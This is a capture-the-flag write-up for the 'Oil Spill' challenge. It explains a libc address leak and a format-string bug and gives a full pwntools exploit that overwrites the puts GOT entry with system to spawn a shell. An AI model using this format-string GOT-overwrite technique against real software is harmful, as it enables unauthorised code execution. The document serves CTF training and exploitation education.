# Oil Spill

## Challenge

Darn, these oil spills are going crazy nowadays. It looks like there's a little bit more than oil coming out of this program though...

Connect ```nc oil.sdc.tf 1337```

[binary](OilSpill)

By green beans

## Solution

The binary leaks the address of the ```puts``` and ```printf``` functions that will allow us to calculate the libc base.

```
004006e2      printf(format: "%p, %p, %p, %p\n", puts, printf, &var_148, temp)

```

The binary also suffers from a format specifier vulnerability.

```
00400724      fgets(buf: &var_148, n: 0x12c, fp: stdin)
00400738      printf(format: &var_148)
```

Since the binary does not have ```RELRO``` enabled, we can overwrite the GOT entries

```
└─# pwn checksec ./OilSpill 
[*] '/root/workspace/ctfs/sdctf/oilspill/OilSpill'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```` 

We will essentially turn puts('Interesting Proposition') into system('/bin/sh\0') by ovewriting the .got entry for ```puts``` and the .data entry for ```x```

```
0040073d  488d3d3c052000     lea     rdi, [rel x]  {"Interesting Proposition"}
00400744  e837feffff         call    puts
...

00600c80  x:
00600c80  49 6e 74 65 72 65 73 74 69 6e 67 20 50 72 6f 70  Interesting Prop
00600c90  6f 73 69 74 69 6f 6e 00                          osition.

````

Our final solution follows:

```python
from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary,checksec=False)
r = ROP(e)

if args.REMOTE:
   libc = ELF('libc6_2.27-3ubuntu1.5_amd64.so',checksec=False)
else: 
   libc = ELF('libc6_2.33-6_amd64.so',checksec=False)

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('oil.sdc.tf',1337)
    else:
        return process(e.path)

p = start()

def leak_libc():
   leaks=p.recvline().split(b',')
   puts_addr = int(leaks[0],16)
   printf_addr = int(leaks[1],16)
   log.info("Puts  Leak: %s" %hex(puts_addr))
   log.info("Printf Leak: %s" %hex(printf_addr))
   return puts_addr, printf_addr

def calc_base(puts_addr,printf_addr):
   base_leak_1 = puts_addr - libc.sym['puts']
   base_leak_2 = printf_addr - libc.sym['printf']
   log.info("Base Leak Off Puts: %s" %hex(base_leak_1))
   log.info("Base Leak Off Printf: %s" %hex(base_leak_2))
   libc.address=base_leak_1

def got_write_sys():
   payload_writes = {
         e.got['puts']: libc.sym['system'],
         0x600c80: b'/bin/sh\0' 
   }

   payload = fmtstr_payload(8,payload_writes,write_size='short')
   p.sendline(payload)
   p.recvline()
   p.interactive()

puts_addr, printf_addr = leak_libc()
calc_base(puts_addr,printf_addr)
got_write_sys()
```